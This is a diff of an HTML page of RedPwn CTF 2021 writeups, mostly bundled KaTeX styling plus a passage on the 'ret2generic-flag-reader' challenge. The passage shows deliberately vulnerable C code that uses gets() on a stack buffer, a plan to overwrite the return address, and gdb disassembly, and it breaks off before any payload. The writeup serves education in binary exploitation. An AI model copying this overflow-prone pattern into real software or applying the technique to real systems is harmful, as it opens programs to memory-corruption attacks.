@@ -4,6 +4,18 @@
         <meta charset="UTF-8">
         <title>RedPwn CTF 2021 Challenge Writups</title>
         <style>
+/* From extension vscode.markdown-math */
+@font-face{font-family:KaTeX_AMS;src:url(fonts/KaTeX_AMS-Regular.woff2) format("woff2"),url(fonts/KaTeX_AMS-Regular.woff) format("woff"),url(fonts/KaTeX_AMS-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Caligraphic;src:url(fonts/KaTeX_Caligraphic-Bold.woff2) format("woff2"),url(fonts/KaTeX_Caligraphic-Bold.woff) format("woff"),url(fonts/KaTeX_Caligraphic-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Caligraphic;src:url(fonts/KaTeX_Caligraphic-Regular.woff2) format("woff2"),url(fonts/KaTeX_Caligraphic-Regular.woff) format("woff"),url(fonts/KaTeX_Caligraphic-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Fraktur;src:url(fonts/KaTeX_Fraktur-Bold.woff2) format("woff2"),url(fonts/KaTeX_Fraktur-Bold.woff) format("woff"),url(fonts/KaTeX_Fraktur-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Fraktur;src:url(fonts/KaTeX_Fraktur-Regular.woff2) format("woff2"),url(fonts/KaTeX_Fraktur-Regular.woff) format("woff"),url(fonts/KaTeX_Fraktur-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Bold.woff2) format("woff2"),url(fonts/KaTeX_Main-Bold.woff) format("woff"),url(fonts/KaTeX_Main-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-BoldItalic.woff2) format("woff2"),url(fonts/KaTeX_Main-BoldItalic.woff) format("woff"),url(fonts/KaTeX_Main-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Italic.woff2) format("woff2"),url(fonts/KaTeX_Main-Italic.woff) format("woff"),url(fonts/KaTeX_Main-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:KaTeX_Main;src:url(fonts/KaTeX_Main-Regular.woff2) format("woff2"),url(fonts/KaTeX_Main-Regular.woff) format("woff"),url(fonts/KaTeX_Main-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Math;src:url(fonts/KaTeX_Math-BoldItalic.woff2) format("woff2"),url(fonts/KaTeX_Math-BoldItalic.woff) format("woff"),url(fonts/KaTeX_Math-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic}@font-face{font-family:KaTeX_Math;src:url(fonts/KaTeX_Math-Italic.woff2) format("woff2"),url(fonts/KaTeX_Math-Italic.woff) format("woff"),url(fonts/KaTeX_Math-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Bold.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Bold.woff) format("woff"),url(fonts/KaTeX_SansSerif-Bold.ttf) format("truetype");font-weight:700;font-style:normal}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Italic.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Italic.woff) format("woff"),url(fonts/KaTeX_SansSerif-Italic.ttf) format("truetype");font-weight:400;font-style:italic}@font-face{font-family:"KaTeX_SansSerif";src:url(fonts/KaTeX_SansSerif-Regular.woff2) format("woff2"),url(fonts/KaTeX_SansSerif-Regular.woff) format("woff"),url(fonts/KaTeX_SansSerif-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Script;src:url(fonts/KaTeX_Script-Regular.woff2) format("woff2"),url(fonts/KaTeX_Script-Regular.woff) format("woff"),url(fonts/KaTeX_Script-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size1;src:url(fonts/KaTeX_Size1-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size1-Regular.woff) format("woff"),url(fonts/KaTeX_Size1-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size2;src:url(fonts/KaTeX_Size2-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size2-Regular.woff) format("woff"),url(fonts/KaTeX_Size2-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size3;src:url(fonts/KaTeX_Size3-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size3-Regular.woff) format("woff"),url(fonts/KaTeX_Size3-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Size4;src:url(fonts/KaTeX_Size4-Regular.woff2) format("woff2"),url(fonts/KaTeX_Size4-Regular.woff) format("woff"),url(fonts/KaTeX_Size4-Regular.ttf) format("truetype");font-weight:400;font-style:normal}@font-face{font-family:KaTeX_Typewriter;src:url(fonts/KaTeX_Typewriter-Regular.woff2) format("woff2"),url(fonts/KaTeX_Typewriter-Regular.woff) format("woff"),url(fonts/KaTeX_Typewriter-Regular.ttf) format("truetype");font-weight:400;font-style:normal}.katex{font:normal 1.21em KaTeX_Main,Times New Roman,serif;line-height:1.2;text-indent:0;text-rendering:auto;border-color:currentColor}.katex *{-ms-high-contrast-adjust:none!important}.katex .katex-version:after{content:"0.13.0"}.katex .katex-mathml{position:absolute;clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:1px;overflow:hidden}.katex .katex-html>.newline{display:block}.katex .base{position:relative;white-space:nowrap;width:-webkit-min-content;width:-moz-min-content;width:min-content}.katex .base,.katex .strut{display:inline-block}.katex .textbf{font-weight:700}.katex .textit{font-style:italic}.katex .textrm{font-family:KaTeX_Main}.katex .textsf{font-family:KaTeX_SansSerif}.katex .texttt{font-family:KaTeX_Typewriter}.katex .mathnormal{font-family:KaTeX_Math;font-style:italic}.katex .mathit{font-family:KaTeX_Main;font-style:italic}.katex .mathrm{font-style:normal}.katex .mathbf{font-family:KaTeX_Main;font-weight:700}.katex .boldsymbol{font-family:KaTeX_Math;font-weight:700;font-style:italic}.katex .amsrm,.katex .mathbb,.katex .textbb{font-family:KaTeX_AMS}.katex .mathcal{font-family:KaTeX_Caligraphic}.katex .mathfrak,.katex .textfrak{font-family:KaTeX_Fraktur}.katex .mathtt{font-family:KaTeX_Typewriter}.katex .mathscr,.katex .textscr{font-family:KaTeX_Script}.katex .mathsf,.katex .textsf{font-family:KaTeX_SansSerif}.katex .mathboldsf,.katex .textboldsf{font-family:KaTeX_SansSerif;font-weight:700}.katex .mathitsf,.katex .textitsf{font-family:KaTeX_SansSerif;font-style:italic}.katex .mainrm{font-family:KaTeX_Main;font-style:normal}.katex .vlist-t{display:inline-table;table-layout:fixed;border-collapse:collapse}.katex .vlist-r{display:table-row}.katex .vlist{display:table-cell;vertical-align:bottom;position:relative}.katex .vlist>span{display:block;height:0;position:relative}.katex .vlist>span>span{display:inline-block}.katex .vlist>span>.pstrut{overflow:hidden;width:0}.katex .vlist-t2{margin-right:-2px}.katex .vlist-s{display:table-cell;vertical-align:bottom;font-size:1px;width:2px;min-width:2px}.katex .vbox{display:inline-flex;flex-direction:column;align-items:baseline}.katex .hbox{width:100%}.katex .hbox,.katex .thinbox{display:inline-flex;flex-direction:row}.katex .thinbox{width:0;max-width:0}.katex .msupsub{text-align:left}.katex .mfrac>span>span{text-align:center}.katex .mfrac .frac-line{display:inline-block;width:100%;border-bottom-style:solid}.katex .hdashline,.katex .hline,.katex .mfrac .frac-line,.katex .overline .overline-line,.katex .rule,.katex .underline .underline-line{min-height:1px}.katex .mspace{display:inline-block}.katex .clap,.katex .llap,.katex .rlap{width:0;position:relative}.katex .clap>.inner,.katex .llap>.inner,.katex .rlap>.inner{position:absolute}.katex .clap>.fix,.katex .llap>.fix,.katex .rlap>.fix{display:inline-block}.katex .llap>.inner{right:0}.katex .clap>.inner,.katex .rlap>.inner{left:0}.katex .clap>.inner>span{margin-left:-50%;margin-right:50%}.katex .rule{display:inline-block;border:0 solid;position:relative}.katex .hline,.katex .overline .overline-line,.katex .underline .underline-line{display:inline-block;width:100%;border-bottom-style:solid}.katex .hdashline{display:inline-block;width:100%;border-bottom-style:dashed}.katex .sqrt>.root{margin-left:.27777778em;margin-right:-.55555556em}.katex .fontsize-ensurer.reset-size1.size1,.katex .sizing.reset-size1.size1{font-size:1em}.katex .fontsize-ensurer.reset-size1.size2,.katex .sizing.reset-size1.size2{font-size:1.2em}.katex .fontsize-ensurer.reset-size1.size3,.katex .sizing.reset-size1.size3{font-size:1.4em}.katex .fontsize-ensurer.reset-size1.size4,.katex .sizing.reset-size1.size4{font-size:1.6em}.katex .fontsize-ensurer.reset-size1.size5,.katex .sizing.reset-size1.size5{font-size:1.8em}.katex .fontsize-ensurer.reset-size1.size6,.katex .sizing.reset-size1.size6{font-size:2em}.katex .fontsize-ensurer.reset-size1.size7,.katex .sizing.reset-size1.size7{font-size:2.4em}.katex .fontsize-ensurer.reset-size1.size8,.katex .sizing.reset-size1.size8{font-size:2.88em}.katex .fontsize-ensurer.reset-size1.size9,.katex .sizing.reset-size1.size9{font-size:3.456em}.katex .fontsize-ensurer.reset-size1.size10,.katex .sizing.reset-size1.size10{font-size:4.148em}.katex .fontsize-ensurer.reset-size1.size11,.katex .sizing.reset-size1.size11{font-size:4.976em}.katex .fontsize-ensurer.reset-size2.size1,.katex .sizing.reset-size2.size1{font-size:.83333333em}.katex .fontsize-ensurer.reset-size2.size2,.katex .sizing.reset-size2.size2{font-size:1em}.katex .fontsize-ensurer.reset-size2.size3,.katex .sizing.reset-size2.size3{font-size:1.16666667em}.katex .fontsize-ensurer.reset-size2.size4,.katex .sizing.reset-size2.size4{font-size:1.33333333em}.katex .fontsize-ensurer.reset-size2.size5,.katex .sizing.reset-size2.size5{font-size:1.5em}.katex .fontsize-ensurer.reset-size2.size6,.katex .sizing.reset-size2.size6{font-size:1.66666667em}.katex .fontsize-ensurer.reset-size2.size7,.katex .sizing.reset-size2.size7{font-size:2em}.katex .fontsize-ensurer.reset-size2.size8,.katex .sizing.reset-size2.size8{font-size:2.4em}.katex .fontsize-ensurer.reset-size2.size9,.katex .sizing.reset-size2.size9{font-size:2.88em}.katex .fontsize-ensurer.reset-size2.size10,.katex .sizing.reset-size2.size10{font-size:3.45666667em}.katex .fontsize-ensurer.reset-size2.size11,.katex .sizing.reset-size2.size11{font-size:4.14666667em}.katex .fontsize-ensurer.reset-size3.size1,.katex .sizing.reset-size3.size1{font-size:.71428571em}.katex .fontsize-ensurer.reset-size3.size2,.katex .sizing.reset-size3.size2{font-size:.85714286em}.katex .fontsize-ensurer.reset-size3.size3,.katex .sizing.reset-size3.size3{font-size:1em}.katex .fontsize-ensurer.reset-size3.size4,.katex .sizing.reset-size3.size4{font-size:1.14285714em}.katex .fontsize-ensurer.reset-size3.size5,.katex .sizing.reset-size3.size5{font-size:1.28571429em}.katex .fontsize-ensurer.reset-size3.size6,.katex .sizing.reset-size3.size6{font-size:1.42857143em}.katex .fontsize-ensurer.reset-size3.size7,.katex .sizing.reset-size3.size7{font-size:1.71428571em}.katex .fontsize-ensurer.reset-size3.size8,.katex .sizing.reset-size3.size8{font-size:2.05714286em}.katex .fontsize-ensurer.reset-size3.size9,.katex .sizing.reset-size3.size9{font-size:2.46857143em}.katex .fontsize-ensurer.reset-size3.size10,.katex .sizing.reset-size3.size10{font-size:2.96285714em}.katex .fontsize-ensurer.reset-size3.size11,.katex .sizing.reset-size3.size11{font-size:3.55428571em}.katex .fontsize-ensurer.reset-size4.size1,.katex .sizing.reset-size4.size1{font-size:.625em}.katex .fontsize-ensurer.reset-size4.size2,.katex .sizing.reset-size4.size2{font-size:.75em}.katex .fontsize-ensurer.reset-size4.size3,.katex .sizing.reset-size4.size3{font-size:.875em}.katex .fontsize-ensurer.reset-size4.size4,.katex .sizing.reset-size4.size4{font-size:1em}.katex .fontsize-ensurer.reset-size4.size5,.katex .sizing.reset-size4.size5{font-size:1.125em}.katex .fontsize-ensurer.reset-size4.size6,.katex .sizing.reset-size4.size6{font-size:1.25em}.katex .fontsize-ensurer.reset-size4.size7,.katex .sizing.reset-size4.size7{font-size:1.5em}.katex .fontsize-ensurer.reset-size4.size8,.katex .sizing.reset-size4.size8{font-size:1.8em}.katex .fontsize-ensurer.reset-size4.size9,.katex .sizing.reset-size4.size9{font-size:2.16em}.katex .fontsize-ensurer.reset-size4.size10,.katex .sizing.reset-size4.size10{font-size:2.5925em}.katex .fontsize-ensurer.reset-size4.size11,.katex .sizing.reset-size4.size11{font-size:3.11em}.katex .fontsize-ensurer.reset-size5.size1,.katex .sizing.reset-size5.size1{font-size:.55555556em}.katex .fontsize-ensurer.reset-size5.size2,.katex .sizing.reset-size5.size2{font-size:.66666667em}.katex .fontsize-ensurer.reset-size5.size3,.katex .sizing.reset-size5.size3{font-size:.77777778em}.katex .fontsize-ensurer.reset-size5.size4,.katex .sizing.reset-size5.size4{font-size:.88888889em}.katex .fontsize-ensurer.reset-size5.size5,.katex .sizing.reset-size5.size5{font-size:1em}.katex .fontsize-ensurer.reset-size5.size6,.katex .sizing.reset-size5.size6{font-size:1.11111111em}.katex .fontsize-ensurer.reset-size5.size7,.katex .sizing.reset-size5.size7{font-size:1.33333333em}.katex .fontsize-ensurer.reset-size5.size8,.katex .sizing.reset-size5.size8{font-size:1.6em}.katex .fontsize-ensurer.reset-size5.size9,.katex .sizing.reset-size5.size9{font-size:1.92em}.katex .fontsize-ensurer.reset-size5.size10,.katex .sizing.reset-size5.size10{font-size:2.30444444em}.katex .fontsize-ensurer.reset-size5.size11,.katex .sizing.reset-size5.size11{font-size:2.76444444em}.katex .fontsize-ensurer.reset-size6.size1,.katex .sizing.reset-size6.size1{font-size:.5em}.katex .fontsize-ensurer.reset-size6.size2,.katex .sizing.reset-size6.size2{font-size:.6em}.katex .fontsize-ensurer.reset-size6.size3,.katex .sizing.reset-size6.size3{font-size:.7em}.katex .fontsize-ensurer.reset-size6.size4,.katex .sizing.reset-size6.size4{font-size:.8em}.katex .fontsize-ensurer.reset-size6.size5,.katex .sizing.reset-size6.size5{font-size:.9em}.katex .fontsize-ensurer.reset-size6.size6,.katex .sizing.reset-size6.size6{font-size:1em}.katex .fontsize-ensurer.reset-size6.size7,.katex .sizing.reset-size6.size7{font-size:1.2em}.katex .fontsize-ensurer.reset-size6.size8,.katex .sizing.reset-size6.size8{font-size:1.44em}.katex .fontsize-ensurer.reset-size6.size9,.katex .sizing.reset-size6.size9{font-size:1.728em}.katex .fontsize-ensurer.reset-size6.size10,.katex .sizing.reset-size6.size10{font-size:2.074em}.katex .fontsize-ensurer.reset-size6.size11,.katex .sizing.reset-size6.size11{font-size:2.488em}.katex .fontsize-ensurer.reset-size7.size1,.katex .sizing.reset-size7.size1{font-size:.41666667em}.katex .fontsize-ensurer.reset-size7.size2,.katex .sizing.reset-size7.size2{font-size:.5em}.katex .fontsize-ensurer.reset-size7.size3,.katex .sizing.reset-size7.size3{font-size:.58333333em}.katex .fontsize-ensurer.reset-size7.size4,.katex .sizing.reset-size7.size4{font-size:.66666667em}.katex .fontsize-ensurer.reset-size7.size5,.katex .sizing.reset-size7.size5{font-size:.75em}.katex .fontsize-ensurer.reset-size7.size6,.katex .sizing.reset-size7.size6{font-size:.83333333em}.katex .fontsize-ensurer.reset-size7.size7,.katex .sizing.reset-size7.size7{font-size:1em}.katex .fontsize-ensurer.reset-size7.size8,.katex .sizing.reset-size7.size8{font-size:1.2em}.katex .fontsize-ensurer.reset-size7.size9,.katex .sizing.reset-size7.size9{font-size:1.44em}.katex .fontsize-ensurer.reset-size7.size10,.katex .sizing.reset-size7.size10{font-size:1.72833333em}.katex .fontsize-ensurer.reset-size7.size11,.katex .sizing.reset-size7.size11{font-size:2.07333333em}.katex .fontsize-ensurer.reset-size8.size1,.katex .sizing.reset-size8.size1{font-size:.34722222em}.katex .fontsize-ensurer.reset-size8.size2,.katex .sizing.reset-size8.size2{font-size:.41666667em}.katex .fontsize-ensurer.reset-size8.size3,.katex .sizing.reset-size8.size3{font-size:.48611111em}.katex .fontsize-ensurer.reset-size8.size4,.katex .sizing.reset-size8.size4{font-size:.55555556em}.katex .fontsize-ensurer.reset-size8.size5,.katex .sizing.reset-size8.size5{font-size:.625em}.katex .fontsize-ensurer.reset-size8.size6,.katex .sizing.reset-size8.size6{font-size:.69444444em}.katex .fontsize-ensurer.reset-size8.size7,.katex .sizing.reset-size8.size7{font-size:.83333333em}.katex .fontsize-ensurer.reset-size8.size8,.katex .sizing.reset-size8.size8{font-size:1em}.katex .fontsize-ensurer.reset-size8.size9,.katex .sizing.reset-size8.size9{font-size:1.2em}.katex .fontsize-ensurer.reset-size8.size10,.katex .sizing.reset-size8.size10{font-size:1.44027778em}.katex .fontsize-ensurer.reset-size8.size11,.katex .sizing.reset-size8.size11{font-size:1.72777778em}.katex .fontsize-ensurer.reset-size9.size1,.katex .sizing.reset-size9.size1{font-size:.28935185em}.katex .fontsize-ensurer.reset-size9.size2,.katex .sizing.reset-size9.size2{font-size:.34722222em}.katex .fontsize-ensurer.reset-size9.size3,.katex .sizing.reset-size9.size3{font-size:.40509259em}.katex .fontsize-ensurer.reset-size9.size4,.katex .sizing.reset-size9.size4{font-size:.46296296em}.katex .fontsize-ensurer.reset-size9.size5,.katex .sizing.reset-size9.size5{font-size:.52083333em}.katex .fontsize-ensurer.reset-size9.size6,.katex .sizing.reset-size9.size6{font-size:.5787037em}.katex .fontsize-ensurer.reset-size9.size7,.katex .sizing.reset-size9.size7{font-size:.69444444em}.katex .fontsize-ensurer.reset-size9.size8,.katex .sizing.reset-size9.size8{font-size:.83333333em}.katex .fontsize-ensurer.reset-size9.size9,.katex .sizing.reset-size9.size9{font-size:1em}.katex .fontsize-ensurer.reset-size9.size10,.katex .sizing.reset-size9.size10{font-size:1.20023148em}.katex .fontsize-ensurer.reset-size9.size11,.katex .sizing.reset-size9.size11{font-size:1.43981481em}.katex .fontsize-ensurer.reset-size10.size1,.katex .sizing.reset-size10.size1{font-size:.24108004em}.katex .fontsize-ensurer.reset-size10.size2,.katex .sizing.reset-size10.size2{font-size:.28929605em}.katex .fontsize-ensurer.reset-size10.size3,.katex .sizing.reset-size10.size3{font-size:.33751205em}.katex .fontsize-ensurer.reset-size10.size4,.katex .sizing.reset-size10.size4{font-size:.38572806em}.katex .fontsize-ensurer.reset-size10.size5,.katex .sizing.reset-size10.size5{font-size:.43394407em}.katex .fontsize-ensurer.reset-size10.size6,.katex .sizing.reset-size10.size6{font-size:.48216008em}.katex .fontsize-ensurer.reset-size10.size7,.katex .sizing.reset-size10.size7{font-size:.57859209em}.katex .fontsize-ensurer.reset-size10.size8,.katex .sizing.reset-size10.size8{font-size:.69431051em}.katex .fontsize-ensurer.reset-size10.size9,.katex .sizing.reset-size10.size9{font-size:.83317261em}.katex .fontsize-ensurer.reset-size10.size10,.katex .sizing.reset-size10.size10{font-size:1em}.katex .fontsize-ensurer.reset-size10.size11,.katex .sizing.reset-size10.size11{font-size:1.19961427em}.katex .fontsize-ensurer.reset-size11.size1,.katex .sizing.reset-size11.size1{font-size:.20096463em}.katex .fontsize-ensurer.reset-size11.size2,.katex .sizing.reset-size11.size2{font-size:.24115756em}.katex .fontsize-ensurer.reset-size11.size3,.katex .sizing.reset-size11.size3{font-size:.28135048em}.katex .fontsize-ensurer.reset-size11.size4,.katex .sizing.reset-size11.size4{font-size:.32154341em}.katex .fontsize-ensurer.reset-size11.size5,.katex .sizing.reset-size11.size5{font-size:.36173633em}.katex .fontsize-ensurer.reset-size11.size6,.katex .sizing.reset-size11.size6{font-size:.40192926em}.katex .fontsize-ensurer.reset-size11.size7,.katex .sizing.reset-size11.size7{font-size:.48231511em}.katex .fontsize-ensurer.reset-size11.size8,.katex .sizing.reset-size11.size8{font-size:.57877814em}.katex .fontsize-ensurer.reset-size11.size9,.katex .sizing.reset-size11.size9{font-size:.69453376em}.katex .fontsize-ensurer.reset-size11.size10,.katex .sizing.reset-size11.size10{font-size:.83360129em}.katex .fontsize-ensurer.reset-size11.size11,.katex .sizing.reset-size11.size11{font-size:1em}.katex .delimsizing.size1{font-family:KaTeX_Size1}.katex .delimsizing.size2{font-family:KaTeX_Size2}.katex .delimsizing.size3{font-family:KaTeX_Size3}.katex .delimsizing.size4{font-family:KaTeX_Size4}.katex .delimsizing.mult .delim-size1>span{font-family:KaTeX_Size1}.katex .delimsizing.mult .delim-size4>span{font-family:KaTeX_Size4}.katex .nulldelimiter{display:inline-block;width:.12em}.katex .delimcenter,.katex .op-symbol{position:relative}.katex .op-symbol.small-op{font-family:KaTeX_Size1}.katex .op-symbol.large-op{font-family:KaTeX_Size2}.katex .accent>.vlist-t,.katex .op-limits>.vlist-t{text-align:center}.katex .accent .accent-body{position:relative}.katex .accent .accent-body:not(.accent-full){width:0}.katex .overlay{display:block}.katex .mtable .vertical-separator{display:inline-block;min-width:1px}.katex .mtable .arraycolsep{display:inline-block}.katex .mtable .col-align-c>.vlist-t{text-align:center}.katex .mtable .col-align-l>.vlist-t{text-align:left}.katex .mtable .col-align-r>.vlist-t{text-align:right}.katex .svg-align{text-align:left}.katex svg{display:block;position:absolute;width:100%;height:inherit;fill:currentColor;stroke:currentColor;fill-rule:nonzero;fill-opacity:1;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-dasharray:none;stroke-dashoffset:0;stroke-opacity:1}.katex svg path{stroke:none}.katex img{border-style:none;min-width:0;min-height:0;max-width:none;max-height:none}.katex .stretchy{width:100%;display:block;position:relative;overflow:hidden}.katex .stretchy:after,.katex .stretchy:before{content:""}.katex .hide-tail{width:100%;position:relative;overflow:hidden}.katex .halfarrow-left{position:absolute;left:0;width:50.2%;overflow:hidden}.katex .halfarrow-right{position:absolute;right:0;width:50.2%;overflow:hidden}.katex .brace-left{position:absolute;left:0;width:25.1%;overflow:hidden}.katex .brace-center{position:absolute;left:25%;width:50%;overflow:hidden}.katex .brace-right{position:absolute;right:0;width:25.1%;overflow:hidden}.katex .x-arrow-pad{padding:0 .5em}.katex .cd-arrow-pad{padding:0 .55556em 0 .27778em}.katex .mover,.katex .munder,.katex .x-arrow{text-align:center}.katex .boxpad{padding:0 .3em}.katex .fbox,.katex .fcolorbox{box-sizing:border-box;border:.04em solid}.katex .cancel-pad{padding:0 .2em}.katex .cancel-lap{margin-left:-.2em;margin-right:-.2em}.katex .sout{border-bottom-style:solid;border-bottom-width:.08em}.katex .angl{box-sizing:border-content;border-top:.049em solid;border-right:.049em solid;margin-right:.03889em}.katex .anglpad{padding:0 .03889em}.katex .eqn-num:before{counter-increment:katexEqnNo;content:"(" counter(katexEqnNo) ")"}.katex .mml-eqn-num:before{counter-increment:mmlEqnNo;content:"(" counter(mmlEqnNo) ")"}.katex .mtr-glue{width:50%}.katex .cd-vert-arrow{display:inline-block;position:relative}.katex .cd-label-left{display:inline-block;position:absolute;right:calc(50% + .3em);text-align:left}.katex .cd-label-right{display:inline-block;position:absolute;left:calc(50% + .3em);text-align:right}.katex-display{display:block;margin:1em 0;text-align:center}.katex-display>.katex{display:block;text-align:center;white-space:nowrap}.katex-display>.katex>.katex-html{display:block;position:relative}.katex-display>.katex>.katex-html>.tag{position:absolute;right:0}.katex-display.leqno>.katex>.katex-html>.tag{left:0;right:auto}.katex-display.fleqn>.katex{text-align:left;padding-left:2em}body{counter-reset:katexEqnNo mmlEqnNo}
+
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.katex-error {
+	color: var(--vscode-editorError-foreground);
+}
+
 </style>
         <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
 <link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
@@ -406,6 +418,452 @@ darkcoder
 </div></code></code></pre>
 <p>...and indeed we have a shell. Pass it to the remote server, run <code>ls; cat flag.txt</code> and the flag is ours.</p>
 <h5 id="flag-flagim-feeling-a-lot-better-but-rob-still-doesnt-pay-me">Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}</h5>
+<h3 id="pwnret2generic-flag-reader">pwn/ret2generic-flag-reader</h3>
+<hr>
+<h4 id="categeory-binary-exploit">Categeory: Binary Exploit</h4>
+<h4 id="difficulty-easy-3">Difficulty: Easy</h4>
+<h4 id="keywords-buffer-overflow-binary-exploit">Keywords: Buffer Overflow, Binary Exploit</h4>
+<h4 id="author-therealdarkcoder-4">Author: TheRealDarkCoder</h4>
+<h4 id="prompt-4">Prompt:&gt;</h4>
+<pre><code><code><div>i'll ace this board meeting with my new original challenge!
+
+nc mc.ax 31077
+</div></code></code></pre>
+<h4 id="overview-4">Overview:&gt;</h4>
+<ol>
+<li>We have an ELF executable, the source code and a netcat port to connect to at a server. Running the binary prompts the following</li>
+</ol>
+<pre><code><code><div>❯ nc mc.ax 31077
+alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
+how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
+slap on some flavortext and there's no way rob will fire me now!
+this is genius!! what do you think?
+AABBCCDD
+</div></code></code></pre>
+<ol start="2">
+<li>Examining the source code, we find there are two functions, <code>main()</code> and <code>super_generic_flag_reading_function_please_ret_to_me()</code>. The second one looks like this</li>
+</ol>
+<pre><code class="language-c"><div><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">super_generic_flag_reading_function_please_ret_to_me</span><span class="hljs-params">()</span>
+</span>{
+  <span class="hljs-keyword">char</span> flag[<span class="hljs-number">0x100</span>] = {<span class="hljs-number">0</span>};
+  FILE *fp = fopen(<span class="hljs-string">&quot;./flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);
+  <span class="hljs-keyword">if</span> (!fp)
+  {
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;no flag!! contact a member of rob inc&quot;</span>);
+    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);
+  }
+  fgets(flag, <span class="hljs-number">0xff</span>, fp);
+  <span class="hljs-built_in">puts</span>(flag);
+  fclose(fp);
+}
+</div></code></pre>
+<p>From my understanding, the function allocates 256 bytes (0x100 in hex) for the flag and fills it with 0s. It then uses <code>fopen()</code> to read a flag.txt file and <code>fgets()</code> the content into the allocated storage.</p>
+<ol start="3">
+<li>We take a look at the <code>main()</code> function</li>
+</ol>
+<pre><code class="language-c"><div><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
+</span>{
+  <span class="hljs-keyword">char</span> comments_and_concerns[<span class="hljs-number">32</span>];
+
+  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
+  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
+  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);
+
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;how about this, we&#x27;ll make a generic pwnable with an overflow and they&#x27;ve got to ret to some flag reading function!&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;slap on some flavortext and there&#x27;s no way rob will fire me now!&quot;</span>);
+  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is genius!! what do you think?&quot;</span>);
+
+  gets(comments_and_concerns);
+}
+</div></code></pre>
+<p>...again, <code>gets()</code> used to get user input, however nothing is done with the userinput. So obviously another buffer overflow.</p>
+<ol start="4">
+<li>
+<p>The attack plan is simple. We need to overwrite some return pointers so that the <code>main()</code> function returns to call the <code>super_generic_flag_reading_function_please_ret_to_me()</code> function which prints the flag.</p>
+</li>
+<li>
+<p>We create a demo <code>flag.txt</code> file and fill it with some &quot;Z&quot;s to simulate the server.</p>
+</li>
+<li>
+<p>We run the given binary with <code>gdb</code> and disassemble the <code>main()</code> function first,</p>
+</li>
+</ol>
+<pre><code class="language-asm"><code><div>...
+
+0x00000000004013e8 &lt;+67&gt;:    call   0x4010c0 &lt;setbuf@plt&gt;
+   0x00000000004013ed &lt;+72&gt;:    lea    rdi,[rip+0xc4c]        # 0x402040
+   0x00000000004013f4 &lt;+79&gt;:    call   0x4010a0 &lt;puts@plt&gt;
+   0x00000000004013f9 &lt;+84&gt;:    lea    rdi,[rip+0xca0]        # 0x4020a0
+   0x0000000000401400 &lt;+91&gt;:    call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401405 &lt;+96&gt;:    lea    rdi,[rip+0xd0c]        # 0x402118
+   0x000000000040140c &lt;+103&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x0000000000401411 &lt;+108&gt;:   lea    rdi,[rip+0xd48]        # 0x402160
+   0x0000000000401418 &lt;+115&gt;:   call   0x4010a0 &lt;puts@plt&gt;
+   0x000000000040141d &lt;+120&gt;:   lea    rax,[rbp-0x20]
+   0x0000000000401421 &lt;+124&gt;:   mov    rdi,rax
+   0x0000000000401424 &lt;+127&gt;:   call   0x4010e0 &lt;gets@plt&gt;
